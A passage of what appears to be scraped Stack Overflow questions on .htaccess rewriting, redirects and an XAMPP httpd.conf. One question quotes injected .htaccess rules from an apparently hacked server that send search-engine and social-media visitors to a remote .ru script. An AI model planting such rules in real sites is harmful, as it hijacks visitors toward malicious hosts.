by:</p>\n\n<ol>\n<li>Un-commenting the <code>LoadModule rewrite_module modules/mod_rewrite.so</code> command in the httpd.conf</li>\n<li>Changing <code>AllowOverride none</code> to <code>AllowOverride All</code></li>\n</ol>\n\n<p>However neither of these solutions have worked for me. I still get the 500 error. My issues sounds identical to this thread <a href=\"http://forums.digitalpoint.com/showthread.php?t=1786841\" rel=\"nofollow\">http://forums.digitalpoint.com/showthread.php?t=1786841</a> , but that issue was never solved. I think the error might be the location of my .htaccess file, but I don't know. Any insight is much appreciated!</p>\n\n<p>Btw, here is my .htaccess file. It is a Wordpress install:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /xampp/websites/demo2/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /xampp/websites/demo2/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>and here is my httpd.conf file</p>\n\n<pre>\n\n    #\n    # This is the main Apache HTTP server configuration file.  It contains the\n    # configuration directives that give the server its instructions.\n    # See  for detailed information.\n    # In particular, see \n    # \n    # for a discussion of each configuration directive.\n    #\n    # Do NOT simply read the instructions in here without understanding\n    # what they do.  They're here only as hints or reminders.  If you are unsure\n    # consult the online docs. You have been warned.  \n    #\n    # Configuration and logfile names: If the filenames you specify for many\n    # of the server's control files begin with \"/\" (or \"drive:/\" for Win32), the\n    # server will use that explicit path.  If the filenames do *not* begin\n    # with \"/\", the value of ServerRoot is prepended -- so \"logs/foo.log\"\n    # with ServerRoot set to \"/xampp/apache\" will be interpreted by the\n    # server as \"/xampp/apache/logs/foo.log\".\n    #\n    # NOTE: Where filenames are specified, you must use forward slashes\n    # instead of backslashes (e.g., \"c:/apache\" instead of \"c:\\apache\").\n    # If a drive letter is omitted, the drive on which httpd.exe is located\n    # will be used by default.  It is recommended that you always supply\n    # an explicit drive letter in absolute paths to avoid confusion.\n\n    #\n    # ServerRoot: The top of the directory tree under which the server's\n    # configuration, error, and log files are kept.\n    #\n    # Do not add a slash at the end of the directory path.  If you point\n    # ServerRoot at a non-local disk, be sure to point the LockFile directive\n    # at a local disk.  If you wish to share the same ServerRoot for multiple\n    # httpd daemons, you will need to change at least LockFile and PidFile.\n    #\n    ServerRoot \"/xampp/apache\"\n\n    #\n    # Listen: Allows you to bind Apache to specific IP addresses and/or\n    # ports, instead of the default. See also the \n    # directive.\n    #\n    # Change this to Listen on specific IP addresses as shown below to \n    # prevent Apache from glomming onto all bound IP addresses.\n    #\n    #Listen 0.0.0.0:80\n    #Listen [::]:80\n    Listen 80\n\n    # Default charset UTF8\n    # AddDefaultCharset utf-8\n\n    #\n    # Dynamic Shared Object (DSO) Support\n    #\n    # To be able to use the functionality of a module which was built as a DSO you\n    # have to place corresponding `LoadModule' lines at this location so the\n    # directives contained in it are actually available _before_ they are used.\n    # Statically compiled modules (those listed by `httpd -l') do not need\n    # to be loaded here.\n    #\n    # Example:\n    # LoadModule foo_module modules/mod_foo.so\n    #\n\n    LoadModule access_compat_module modules/mod_access_compat.so\n    LoadModule actions_module modules/mod_actions.so\n    LoadModule alias_module modules/mod_alias.so\n    LoadModule allowmethods_module modules/mod_allowmethods.so\n    LoadModule asis_module modules/mod_asis.so\n    LoadModule auth_basic_module modules/mod_auth_basic.so\n    #LoadModule auth_digest_module modules/mod_auth_digest.so\n    #LoadModule authn_anon_module modules/mod_authn_anon.so\n    LoadModule authn_core_module modules/mod_authn_core.so\n    #LoadModule authn_dbd_module modules/mod_authn_dbd.so\n    #LoadModule authn_dbm_module modules/mod_authn_dbm.so\n    LoadModule authn_file_module modules/mod_authn_file.so\n    #LoadModule authn_socache_module modules/mod_authn_socache.so\n    #LoadModule authnz_ldap_module modules/mod_authnz_ldap.so\n    LoadModule authz_core_module modules/mod_authz_core.so\n    #LoadModule authz_dbd_module modules/mod_authz_dbd.so\n    #LoadModule authz_dbm_module modules/mod_authz_dbm.so\n    LoadModule authz_groupfile_module modules/mod_authz_groupfile.so\n    LoadModule authz_host_module modules/mod_authz_host.so\n    #LoadModule authz_owner_module modules/mod_authz_owner.so\n    LoadModule authz_user_module modules/mod_authz_user.so\n    LoadModule autoindex_module modules/mod_autoindex.so\n    #LoadModule bucketeer_module modules/mod_bucketeer.so\n    #LoadModule cache_module modules/mod_cache.so\n    #LoadModule case_filter_module modules/mod_case_filter.so\n    #LoadModule case_filter_in_module modules/mod_case_filter_in.so\n    #LoadModule cern_meta_module modules/mod_cern_meta.so\n    LoadModule cgi_module modules/mod_cgi.so\n    #LoadModule charset_lite_module modules/mod_charset_lite.so\n    #LoadModule dav_module modules/mod_dav.so\n    #LoadModule dav_fs_module modules/mod_dav_fs.so\n    LoadModule dav_lock_module modules/mod_dav_lock.so\n    #LoadModule dbd_module modules/mod_dbd.so\n    #LoadModule deflate_module modules/mod_deflate.so\n    LoadModule dir_module modules/mod_dir.so\n    #LoadModule disk_cache_module modules/mod_disk_cache.so\n    #LoadModule dumpio_module modules/mod_dumpio.so\n    #LoadModule echo_module modules/mod_echo.so\n    LoadModule env_module modules/mod_env.so\n    #LoadModule example_module modules/mod_example.so\n    #LoadModule expires_module modules/mod_expires.so\n    #LoadModule ext_filter_module modules/mod_ext_filter.so\n    #LoadModule fcgid_module modules/mod_fcgid.so # did not work at runtime\n    #LoadModule file_cache_module modules/mod_file_cache.so\n    #LoadModule filter_module modules/mod_filter.so\n    LoadModule headers_module modules/mod_headers.so\n    #LoadModule ident_module modules/mod_ident.so\n    #LoadModule imagemap_module modules/mod_imagemap.so\n    LoadModule include_module modules/mod_include.so\n    LoadModule info_module modules/mod_info.so\n    LoadModule isapi_module modules/mod_isapi.so\n    #LoadModule ldap_module modules/mod_ldap.so\n    #LoadModule logio_module modules/mod_logio.so\n    LoadModule log_config_module modules/mod_log_config.so\n    #LoadModule log_forensic_module modules/mod_log_forensic.so\n    LoadModule cache_disk_module modules/mod_cache_disk.so\n    LoadModule mime_module modules/mod_mime.so\n    #LoadModule mime_magic_module modules/mod_mime_magic.so\n    LoadModule negotiation_module modules/mod_negotiation.so\n    LoadModule proxy_module modules/mod_proxy.so\n    LoadModule proxy_ajp_module modules/mod_proxy_ajp.so\n    #LoadModule proxy_balancer_module modules/mod_proxy_balancer.so\n    #LoadModule proxy_connect_module modules/mod_proxy_connect.so\n    #LoadModule proxy_ftp_module modules/mod_proxy_ftp.so\n    #LoadModule proxy_http_module modules/mod_proxy_http.so\n    LoadModule rewrite_module modules/mod_rewrite.so\n    LoadModule setenvif_module modules/mod_setenvif.so\n    #LoadModule speling_module modules/mod_speling.so\n    LoadModule ssl_module modules/mod_ssl.so\n    LoadModule status_module modules/mod_status.so\n    #LoadModule substitute_module modules/mod_substitute.so\n    #LoadModule unique_id_module modules/mod_unique_id.so\n    #LoadModule userdir_module modules/mod_userdir.so\n    #LoadModule usertrack_module modules/mod_usertrack.so\n    #LoadModule version_module modules/mod_version.so\n    #LoadModule vhost_alias_module modules/mod_vhost_alias.so\n\n    \n    \n    #\n    # If you wish httpd to run as a different user or group, you must run\n    # httpd as root initially and it will switch.  \n    #\n    # User/Group: The name (or #number) of the user/group to run httpd as.\n    # It is usually good practice to create a dedicated user and group for\n    # running httpd, as with most system services.\n    #\n    User daemon\n    Group daemon\n\n    \n    \n\n    # 'Main' server configuration\n    #\n    # The directives in this section set up the values used by the 'main'\n    # server, which responds to any requests that aren't handled by a\n    #  definition.  These values also provide defaults for\n    # any  containers you may define later in the file.\n    #\n    # All of these directives may appear inside  containers,\n    # in which case these default settings will be overridden for the\n    # virtual host being defined.\n    #\n\n    #\n    # ServerAdmin: Your address, where problems with the server should be\n    # e-mailed.  This address appears on some server-generated pages, such\n    # as error documents.  e.g. admin@your-domain.com\n    #\n    ServerAdmin postmaster@localhost\n\n    #\n    # ServerName gives the name and port that the server uses to identify itself.\n    # This can often be determined automatically, but we recommend you specify\n    # it explicitly to prevent problems during startup.\n    #\n    # If your host doesn't have a registered DNS name, enter its IP address here.\n    #\n    ServerName localhost:80\n\n    #\n    # DocumentRoot: The directory out of which you will serve your\n    # documents. By default, all requests are taken from this directory, but\n    # symbolic links and aliases may be used to point to other locations.\n    #\n    DocumentRoot \"/xampp/htdocs\"\n\n    #\n    # Each directory to which Apache has access can be configured with respect\n    # to which services and features are allowed and/or disabled in that\n    # directory (and its subdirectories). \n    #\n    # First, we configure the \"default\" to be a very restrictive set of \n    # features.  \n    #\n    \n        AllowOverride All\n        Require all granted\n    \n\n\n    # XAMPP: We disable operating system specific optimizations for a listening \n    # socket by the http protocol here. IE 64 bit make problems without this.  \n    AcceptFilter http none\n\n    #\n    # Note that from this point forward you must specifically allow\n    # particular features to be enabled - so if something's not working as\n    # you might expect, make sure that you have specifically enabled it\n    # below.\n    #\n\n    #\n    # This should be changed to whatever you set DocumentRoot to.\n    #\n    \n        #\n        # Possible values for the Options directive are \"None\", \"All\",\n        # or any combination of:\n        #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews\n        #\n        # Note that \"MultiViews\" must be named *explicitly* --- \"Options All\"\n        # doesn't give it to you.\n        #\n        # The Options directive is both complicated and important.  Please see\n        # http://httpd.apache.org/docs/2.2/mod/core.html#options\n        # for more information.\n        #\n        Options Indexes FollowSymLinks Includes ExecCGI\n\n        #\n        # AllowOverride controls what directives may be placed in .htaccess files.\n        # It can be \"All\", \"None\", or any combination of the keywords:\n        #   Options FileInfo AuthConfig Limit\n        #\n        AllowOverride All\n\n        #\n        # Controls who can get stuff from this server.\n        #\n        Require all granted\n\n    \n\n    #\n    # DirectoryIndex: sets the file that Apache will serve if a directory\n    # is requested.\n    #\n    \n        DirectoryIndex index.php index.pl index.cgi index.asp index.shtml index.html index.htm \\\n                       default.php default.pl default.cgi default.asp default.shtml default.html default.htm \\\n                       home.php home.pl home.cgi home.asp home.shtml home.html home.htm\n    \n\n    #\n    # The following lines prevent .htaccess and .htpasswd files from being \n    # viewed by Web clients. \n    #\n    \n        Require all denied\n    \n\n    #\n    # ErrorLog: The location of the error log file.\n    # If you do not specify an ErrorLog directive within a \n    # container, error messages relating to that virtual host will be\n    # logged here.  If you *do* define an error logfile for a \n    # container, that host's errors will be logged there and not here.\n    #\n    ErrorLog \"logs/error.log\"\n\n    #ScriptLog \"logs/cgi.log\"\n\n    #\n    # LogLevel: Control the number of messages logged to the error_log.\n    # Possible values include: debug, info, notice, warn, error, crit,\n    # alert, emerg.\n    #\n    LogLevel warn\n\n    \n        #\n        # The following directives define some format nicknames for use with\n        # a CustomLog directive (see below).\n        #\n        LogFormat \"%h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\" combined\n        LogFormat \"%h %l %u %t \\\"%r\\\" %>s %b\" common\n\n        \n          # You need to enable mod_logio.c to use %I and %O\n          LogFormat \"%h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\" %I %O\" combinedio\n        \n\n        #\n        # The location and format of the access logfile (Common Logfile Format).\n        # If you do not define any access logfiles within a \n        # container, they will be logged here.  Contrariwise, if you *do*\n        # define per- access logfiles, transactions will be\n        # logged therein and *not* in this file.\n        #\n        #CustomLog \"logs/access.log\" common\n\n        #\n        # If you prefer a logfile with access, agent, and referer information\n        # (Combined Logfile Format) you can use the following directive.\n        #\n        CustomLog \"logs/access.log\" combined\n    \n\n    \n        #\n        # Redirect: Allows you to tell clients about documents that used to \n        # exist in your server's namespace, but do not anymore. The client \n        # will make a new request for the document at its new location.\n        # Example:\n        # Redirect permanent /foo http://localhost/bar\n\n        #\n        # Alias: Maps web paths into filesystem paths and is used to\n        # access content that does not live under the DocumentRoot.\n        # Example:\n        # Alias /webpath /full/filesystem/path\n        #\n        # If you include a trailing / on /webpath then the server will\n        # require it to be present in the URL.  You will also likely\n        # need to provide a  section to allow access to\n        # the filesystem path.\n\n        #\n        # ScriptAlias: This controls which directories contain server scripts. \n        # ScriptAliases are essentially the same as Aliases, except that\n        # documents in the target directory are treated as applications and\n        # run by the server when requested rather than as documents sent to the\n        # client.  The same rules about trailing \"/\" apply to ScriptAlias\n        # directives as to Alias.\n        #\n        ScriptAlias /cgi-bin/ \"/xampp/cgi-bin/\"\n\n    \n\n    \n        #\n        # ScriptSock: On threaded servers, designate the path to the UNIX\n        # socket used to communicate with the CGI daemon of mod_cgid.\n        #\n        #Scriptsock \"logs/cgi.sock\"\n    \n\n    #\n    # \"/xampp/cgi-bin\" should be changed to whatever your ScriptAliased\n    # CGI directory exists, if you have that configured.\n    #\n    \n        AllowOverride All\n        Options None\n        Require all granted\n    \n\n\n    \n        #\n        # TypesConfig points to the file containing the list of mappings from\n        # filename extension to MIME-type.\n        #\n        TypesConfig \"conf/mime.types\"\n\n        #\n        # AddType allows you to add to or override the MIME configuration\n        # file specified in TypesConfig for specific file types.\n        #\n        #AddType application/x-gzip .tgz\n        #\n        # AddEncoding allows you to have certain browsers uncompress\n        # information on the fly. Note: Not all browsers support this.\n        #\n        #AddEncoding x-compress .Z\n        #AddEncoding x-gzip .gz .tgz\n        #\n        # If the AddEncoding directives above are commented-out, then you\n        # probably should define those extensions to indicate media types:\n        #\n        AddType application/x-compress .Z\n        AddType application/x-gzip .gz .tgz\n\n        #\n        # AddHandler allows you to map certain file extensions to \"handlers\":\n        # actions unrelated to filetype. These can be either built into the server\n        # or added with the Action directive (see below)\n        #\n        # To use CGI scripts outside of ScriptAliased directories:\n        # (You will also need to add \"ExecCGI\" to the \"Options\" directive.)\n        #\n        AddHandler cgi-script .cgi .pl .asp\n\n        # For type maps (negotiated resources):\n        #AddHandler type-map var\n\n        #\n        # Filters allow you to process content before it is sent to the client.\n        #\n        # To parse .shtml files for server-side includes (SSI):\n        # (You will also need to add \"Includes\" to the \"Options\" directive.)\n        #\n        AddType text/html .shtml\n        AddOutputFilter INCLUDES .shtml\n    \n\n    \n        #\n        # The mod_mime_magic module allows the server to use various hints from the\n        # contents of the file itself to determine its type.  The MIMEMagicFile\n        # directive tells the module where the hint definitions are located.\n        #\n        MIMEMagicFile \"conf/magic\"\n    \n\n    #\n    # Customizable error responses come in three flavors:\n    # 1) plain text 2) local redirects 3) external redirects\n    #\n    # Some examples:\n    #ErrorDocument 500 \"The server made a boo boo.\"\n    #ErrorDocument 404 /missing.html\n    #ErrorDocument 404 \"/cgi-bin/missing_handler.pl\"\n    #ErrorDocument 402 http://localhost/subscription_info.html\n    #\n\n    #\n    # EnableMMAP and EnableSendfile: On systems that support it, \n    # memory-mapping or the sendfile syscall is used to deliver\n    # files.  This usually improves server performance, but must\n    # be turned off when serving from networked-mounted \n    # filesystems or if support for these functions is otherwise\n    # broken on your system.\n    #\n    #EnableMMAP off\n    #EnableSendfile off\n\n    # Supplemental configuration\n    #\n    # The configuration files in the conf/extra/ directory can be \n    # included to add extra features or to modify the default configuration of \n    # the server, or you may simply copy their contents here and change as \n    # necessary.\n\n    # XAMPP specific settings\n    Include \"conf/extra/httpd-xampp.conf\"\n\n    # Server-pool management (MPM specific)\n    Include \"conf/extra/httpd-mpm.conf\"\n\n    # Multi-language error messages\n    Include \"conf/extra/httpd-multilang-errordoc.conf\"\n\n    # Fancy directory listings\n    Include \"conf/extra/httpd-autoindex.conf\"\n\n    # Language settings\n    Include \"conf/extra/httpd-languages.conf\"\n\n    # User home directories\n    Include \"conf/extra/httpd-userdir.conf\"\n\n    # Real-time info on requests and configuration\n    Include \"conf/extra/httpd-info.conf\"\n\n    # Virtual hosts\n    Include \"conf/extra/httpd-vhosts.conf\"\n\n    # Distributed authoring and versioning (WebDAV)\n    # Attention! WEB_DAV is a security risk without a new userspecific configuration for a secure authentifcation \n    # Include \"conf/extra/httpd-dav.conf\"\n\n    # Implements a proxy/gateway for Apache.\n    Include \"conf/extra/httpd-proxy.conf\"\n\n    # Various default settings\n    Include \"conf/extra/httpd-default.conf\"\n\n    # Secure (SSL/TLS) connections\n    Include \"conf/extra/httpd-ssl.conf\"\n    #\n    # Note: The following must must be present to support\n    #       starting without SSL on platforms with no /dev/random equivalent\n    #       but a statically compiled-in mod_ssl.\n    #\n    \n        SSLRandomSeed startup builtin\n        SSLRandomSeed connect builtin\n    \n\n    # Configure mod_proxy_html to understand HTML4/XHTML1\n    #\n    #Include etc/extra/proxy-html.conf\n    #\n\n    # AJP13 Proxy\n    \n    \n    Include \"conf/extra/httpd-ajp.conf\"\n    \n    \n\n</pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13275840,"title":"mod_rewrite to not visible file","body":"<p>I'm missing something about .htaccess.</p>\n\n<p>working tree like:</p>\n\n<pre><code>/\n/subdomain\n/subdomain/.htaccess\n/subdomain/index.php\n/assets\n/assets/...\n</code></pre>\n\n<p>the htaccess is inside subdomain and I'm accessing this like: <code>http://subdomain.localhost/</code></p>\n\n<p>assets is outside of subdomain and I did this rule:</p>\n\n<pre><code>RewriteRule ^assets/(.*)$ http://localhost/assets/$1\n</code></pre>\n\n<p>Now, when subdomain/index.php tries to load something like assets/style.css the rewriterule redirect to <code>http://localhost/assets/style.css</code>.</p>\n\n<p>The problem appears when I try to load a javascript file. It's recognized as a different domain, and doesn't work properly.</p>\n\n<p>Is there a way to make <code>http://subdomain.localhost/assets</code> works as (and not a redirection) <code>http://localhost/assets</code> via some magic rewriterule or something else?</p>\n\n<p>I tried <code>^assets/(.*)$ ../assets/$1</code> but it seems not working.</p>\n"},{"tags":["linux","windows",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13228724,"title":"htacess rewriterule windows/linux , domain to subpage","body":"<p>I have .htacess rule defined :</p>\n\n<pre><code># *** Presmerovania ***\n\nRewriteEngine on\n\n#www.domosskuchyne.sk\nrewritecond %{http_host} ^www\\.kuchynskelinkymoderne\\.sk$ [nc]\nrewriterule ^(.*)$ http://www.domosskuchyne.sk/bosch [r=301,nc]\n</code></pre>\n\n<p>On windows i get redirected to \"http://www.domosskuchyne.sk/bosch\" , but on linux server i am redirected only on main page \"http://www.domosskuchyne.sk\" not to subpage (/bosch) .</p>\n\n<p>Is there something wrong with this rewrite rule ? .</p>\n\n<p>Thnx for any answer .</p>\n"},{"tags":[".htaccess","mod-rewrite","http-accept-language"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13288589,"title":".htaccess combine multiple RewriteCond with several RewriteRule","body":"<p>as i am new to .htaccess, i couldn´t figure out how to make this work:\nOn my webserver the default index.html (/var/www/) should be redirected to different other index.html regarding the time of the day and the browser language...</p>\n\n<ul>\n<li>/index.html (default, german, black background for the night)</li>\n<li>/i/index.html (german, white background for the day)</li>\n<li>/e/index.html (english, black background for the night)</li>\n<li>/e/i/index.html (english, white background for the day)</li>\n</ul>\n\n<p>All pages are linked with each other, so that the user can jump between language and \"style\".\nUsing only the time-condition it works for german, but how can i combine this with \"english\"?\nI tried this one, but it didn´t work...</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\n\nRewriteCond %{TIME_HOUR} &gt;07\nRewriteCond %{TIME_HOUR} &lt;16\nRewriteCond %{HTTP:Accept-Language} ^en [NC]\nRewriteRule ^index\\.html$ /e/i/index.html [L]\n\nRewriteCond %{TIME_HOUR} &gt;07\nRewriteCond %{TIME_HOUR} &lt;16\nRewriteCond %{HTTP:Accept-Language} ^de [NC]\nRewriteRule ^index\\.html$ /i/index.html [L]\n\n\nRewriteCond %{TIME_HOUR} &gt;16\nRewriteCond %{TIME_HOUR} &lt;07\nRewriteCond %{HTTP:Accept-Language} ^en [NC]\nRewriteRule ^index\\.html$ /e/index.html [L]\n\nRewriteCond %{TIME_HOUR} &gt;16\nRewriteCond %{TIME_HOUR} &lt;07\nRewriteCond %{HTTP:Accept-Language} ^de [NC]\nRewriteRule ^index\\.html$ /index.html [L]\n</code></pre>\n\n<p>Could somebody help please?\nMany Thanks!</p>\n"},{"tags":[".htaccess","cakephp","cakephp-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":22,"score":4,"question_id":13287341,"title":"URL redirecting using .htaccess in Cakephp 2.0","body":"<p>I am using Cakephp 2.0 and my website domain name is www.sample.com , If I try to access sample.com (with out www) then its going to www.sample.com this is fine. But My problem is my domain consists of lot of pages\nfor example :</p>\n\n<pre><code>&gt; http://www.sample.com/users/login\n&gt; http://www.sample.com/users/add\n</code></pre>\n\n<p>If I access the above url like <a href=\"http://sample.com/users/login\" rel=\"nofollow\">http://sample.com/users/login</a> then it redirect to </p>\n\n<pre><code>&gt;  http://www.sample.com/index.php?url=users/login\n</code></pre>\n\n<p>but it needs to redirect to  </p>\n\n<pre><code>   http://www.sample.com/users/login\n</code></pre>\n\n<p>I already written the following code .htaccess file(before the app folder) to redirect </p>\n\n<pre><code>Rewritecond %{http_host} ^sample.com [NC]\nRewriterule ^(.*)$ http://www.sample.com/$1 [R=301,NC]\n</code></pre>\n\n<p>Inside webroot folder I have one .htacces file that contain the following code\nmay be that is the problem I think </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php?/$1 [QSA,L]\n</code></pre>\n\n<p></p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13278908,"title":".htaccess rewrite rule from mydomain.com/contact.htm to mydomain.com/contact","body":"<p>I guess this was a very common and simple .htacceess rewrite rule, however I wasn't able to google a solution for it.</p>\n\n<p>So, the question is in the title already, how can I rewrite the address to change it from <strong>mydomain.com/contact.htm to mydomain.com/contact ?</strong> The rule would of course not be only for just the contact.htm but for any page in the website. No need to worry about GET variables, since I won't be using any.</p>\n\n<p>[ Also, do you think this is or might be considered a good practice or not really relevant? ]</p>\n\n<p>Thanks.</p>\n"},{"tags":["php",".htaccess","get"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13287889,"title":"Rejecting urls using PHP $_GET and .htaccess","body":"<p>I have <code>index.php</code> with only one line</p>\n\n<pre><code>&lt;?php echo $_GET['a']; ?&gt;\n</code></pre>\n\n<p>If I enter the <code>url</code>:</p>\n\n<pre><code>http://localhost/test/?a=abc.....\n</code></pre>\n\n<p>I get</p>\n\n<pre><code>abc.....\n</code></pre>\n\n<p>but if I create <code>.htaccess</code> and write:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^([a-z]+)$ ?a=$1\n</code></pre>\n\n<p>And if I enter the <code>url</code>:</p>\n\n<pre><code>http://localhost/test/abc.....\n</code></pre>\n\n<p>I only get <code>abc</code> (without the dots <code>.....</code>)</p>\n\n<p>Why is this happening?</p>\n\n<p>I want to get an <code>404 error</code> if <code>abc.....</code> string is sent. How can I archieve this?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13285759,"title":".htaccess move up one directory level issue","body":"<p>i was unable to find answer, so there it is:</p>\n\n<p>i need to get URL like this:   //mydomain/index.php?var=username (or https:// if user want secure connection).</p>\n\n<p>To use nice URL I want to use:  //mydomain/user/username (this should stay in the browser URL line) to get: //mydomain/index.php?var=username</p>\n\n<p>I have configured .htaccess to:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteRule ^user/([^/]+)/?$ /index.php?var=$1 [L]\n</code></pre>\n\n<p>But it doesn't work. When i use redirection [R,L] it works fine, but in the URL line of browser is the ugly URL after it :(</p>\n\n<p>Please can You help me, what i have wrong?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13288041,"title":"Make a .htaccess priority over a folder","body":"<p>This is my root folder :</p>\n\n<ul>\n<li><strong>index.php</strong></li>\n<li><strong>myfolder</strong> (which contains other files, and a htaccess containing \"<em>deny from all</em>\"). </li>\n</ul>\n\n<p>When I access to <a href=\"http://www.domain.com/myfolder\" rel=\"nofollow\">http://www.domain.com/myfolder</a>, I want to rewrite it to <a href=\"http://www.domain.com/Myfolder\" rel=\"nofollow\">http://www.domain.com/Myfolder</a>, but it seems that <strong>it enters in the folder before the RewriteRule</strong> (I have a 401).</p>\n\n<p>Here is my .htaccess </p>\n\n<pre><code># Charset\nAddDefaultCharset UTF-8\n\n# URL Rewriting\nRewriteEngine on\n\nRewriteCond %{REQUEST_URI} /myfolder\nRewriteRule ^(.*)$ /Myfolder [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?nav=$1 [L,QSA]\n</code></pre>\n\n<p>What's wrong with this ? Thank you !</p>\n"},{"tags":[".htaccess","virus"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13287168,"title":".htaccess file keep redirecting to Google","body":"<p>I have strange behaviour of .htaccess file on my server. Each time I remove it it's coming back with wrong code. so each time I type domain in to browser I got Google, each time I search in Google and click link to my website I got Google, code inserted in .htaccess is below: (could you tell me how to fix this, it must be some king of male-ware or virus on server?)</p>\n\n<pre><code>ErrorDocument 500 http://regeditever.ru/tabletfocusedmilliseconds.cgi?8                                                                                             \n</code></pre>\n\n<p><br>\nRewriteEngine On<br>\nRewriteCond %{HTTP_REFERER} ^.<em>(duckduckgo|ask|google|dogpile|archive|clusty|mahalo|mywebsearch|blekko|lycos|webcrawler|info|infospace|search|excite|goodsearch|altavista|live|msn|aol|yahoo|youtube|wikipedia|infoseek|bing|facebook|twitter|myspace|linkedin|flickr|deviantart|livejournal|tagged|badoo|mylife|ning|pinterest).(.</em>)<br>\nRewriteRule ^(.*)$ <a href=\"http://regeditever.ru/tabletfocusedmilliseconds.cgi?8\" rel=\"nofollow\">http://regeditever.ru/tabletfocusedmilliseconds.cgi?8</a> [R=301,L]<br>\n     </p>\n"},{"tags":[".htaccess","redirect","joomla","seo-friendly"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13278420,"title":"301 Redirect on older Joomla SEF URLS","body":"<p>I am working on removing an old Joomla 1.0 site that has the SEF module installed.   I need to redirect the URLs to static pages in a search engine friendly way. </p>\n\n<p>A typical URL looks like:  www.mysite.com/index.php?/this-page.html.<br>\nI need to forward it to a static page on the same site like: www.mysite.com/this-page.html</p>\n\n<p>So, I edited htaccess to read:</p>\n\n<pre><code>redirect 301 /index.php?/this-page.html http://www.mysite.com/this-page.html\n</code></pre>\n\n<p>The redirect does not seem to work.  Any ideas?   A wild card redirect to strip out the \"/index.php?/\"  would be a bonus since I have to do about 80.  I'm happy to do them manually, too.</p>\n"},{"tags":["apache",".htaccess","url","redirect","mod-alias"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":13286778,"title":"Can I do a server-side redirect to a subfolder and preserve url parameters of the original link?","body":"<p>I need to redirect links from external pages to an application into a subfolder.</p>\n\n<p>My \"old\" links where like this:</p>\n\n<pre><code> https://www.somepage.com/index.cfm?id=abc\n</code></pre>\n\n<p>Which I now have to change to:</p>\n\n<pre><code> https://www.somepage.com/mem/index.cfm?id=abc\n</code></pre>\n\n<p>While I informed all users to update their links, I'm sure I will have to chase some for a while, so my idea was to try and setup a redirect server side. What I'm not sure is how to preserve the url parameter on the re-direct. Is something like this possible at all?</p>\n\n<p>Thanks for some insights!</p>\n"},{"tags":[".htaccess","codeigniter","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":654,"score":0,"question_id":5398534,"title":"Cannot remove index.php from my urls in Codeigniter","body":"<p>I am using codeigniter and when I set up the website I added necessary code in my .htaccess file to remove index.php (default) from my urls. I just happened to replace my public_html folder from a back up file of my website. Since I did that, I cannot get any of the links on home page to work unless insert index.php in the url between the domain name and the rest of the url as in <a href=\"http://www.obsia.com/index.php/contact/\" rel=\"nofollow\">http://www.obsia.com/index.php/contact/</a> instead of <a href=\"http://www.obsia.com/contact/\" rel=\"nofollow\">http://www.obsia.com/contact/</a> and it works. So, in my config file within the application folder, I changed  </p>\n\n<pre><code>$config['index_page'] = \"\";  \n</code></pre>\n\n<p>to  </p>\n\n<pre><code>$config['index_page'] = \"index.php\";\n</code></pre>\n\n<p>and all the links seem to work now. But how do I remove index.php from the URLs.</p>\n\n<p>Here is what my .htaccess code looks like:  </p>\n\n<pre><code>RewriteEngine on\nRewriteBase / \nRewriteCond $1 !^(index\\.php|public|user_guide|robots\\.txt|css)\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>Can anyone point me in the right direction. It will much appreciated.</p>\n\n<p>Regards,\nG</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13284469,"title":"Wordpress blog redirect to another URL from google search engine result","body":"<p>My website is <a href=\"http://www.padmavatiwealth.com\" rel=\"nofollow\">www.padmavatiwealth.com</a>. When I reach directly to this website then It is working fine but when I go through google search engine It redirects me to another strange website. I used wordpress to develop this website. I don't understand what is happening here.</p>\n\n<p>Please help me. Below is google URL which redirects me to another URL, instead of padmavatiwealth.com.</p>\n\n<p><a 